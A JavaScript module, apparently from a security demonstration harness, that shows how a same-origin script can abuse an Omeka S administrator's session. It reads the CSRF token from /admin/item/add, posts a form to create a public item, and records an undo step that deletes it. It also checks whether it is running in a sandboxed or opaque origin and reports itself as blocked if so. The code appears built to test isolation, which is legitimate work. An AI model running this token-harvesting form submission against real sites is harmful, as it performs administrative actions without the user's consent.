/*
 * Acción de demostración contra Omeka S.
 *
 * La API REST de Omeka S exige key_identity/key_credential, así que la cookie de
 * sesión no basta. El vector real es el formulario de administración, que sí es
 * CSRF-able con el token del propio usuario: se lee el csrf de /admin/item/add y
 * se reenvía el formulario. Solo funciona en same-origin.
 */

export function readCsrf(doc) {
  if (!doc) return null;
  const input = doc.querySelector('input[name="csrf"], input[name$="[csrf]"]');
  return input ? input.getAttribute('value') : null;
}

function blocked(ctx) {
  try {
    if (ctx.win.origin === 'null' || (ctx.win.location && ctx.win.location.origin === 'null')) {
      return 'BLOQUEADO (origen opaco / modo secure)';
    }
  } catch (e) { /* ignorado */ }
  if (!ctx.parentDoc()) return 'BLOQUEADO: sin acceso al padre (origen opaco / modo secure)';
  return null;
}

export function createItem(ctx, journal, cb) {
  const stop = blocked(ctx);
  if (stop) { cb(stop); return; }

  const title = journal.prefix('item');
  const res = { itemCreated: false, title };

  ctx.fetchSameOrigin('/admin/item/add')
    .then((r) => r.text())
    .then((html) => {
      const parsed = new DOMParser().parseFromString(html, 'text/html');
      const csrf = readCsrf(parsed) || readCsrf(ctx.parentDoc());
      if (!csrf) {
        res.note = 'sin token csrf alcanzable (¿sesión de administración abierta?)';
        cb(JSON.stringify(res, null, 2));
        return null;
      }

      const body = new URLSearchParams();
      body.set('csrf', csrf);
      body.set('o:is_public', '1');
      body.set('o:resource_class[o:id]', '');
      body.set('o:resource_template[o:id]', '');
      // property_id 1 es dcterms:title en una instalación por defecto.
      body.set('dcterms:title[0][property_id]', '1');
      body.set('dcterms:title[0][type]', 'literal');
      body.set('dcterms:title[0][@value]', title);

      return ctx.fetchSameOrigin('/admin/item/add', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
      });
    })
    .then((r) => {
      if (!r) return;
      const id = String(r.url || '').replace(/.*\/admin\/item\/(\d+).*/, '$1');
      if (!/^\d+$/.test(id)) {
        res.note = 'el formulario no redirigió a un ítem: no se completó la creación';
        cb(JSON.stringify(res, null, 2));
        return;
      }

      journal.record({
        host: 'omeka',
        kind: 'item',
        label: 'Ítem ' + title,
        id,
        previous: null,
        undo: () => ctx.fetchSameOrigin('/admin/item/' + id + '/delete')
          .then((rr) => rr.text())
          .then((html) => {
            const csrf = readCsrf(new DOMParser().parseFromString(html, 'text/html'));
            const body = new URLSearchParams();
            if (csrf) body.set('csrf', csrf);
            return ctx.fetchSameOrigin('/admin/item/' + id + '/delete', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: body.toString(),
            });
          })
          .then(() => undefined),
      });

      res.itemCreated = true;
      res.id = id;
      res.note = 'Ítem creado con la sesión de administración. Reversible desde el diario.';
      cb(JSON.stringify(res, null, 2));
    })
    .catch((e) => cb('BLOQUEADO: ' + ((e && e.name) || 'Error')));
}
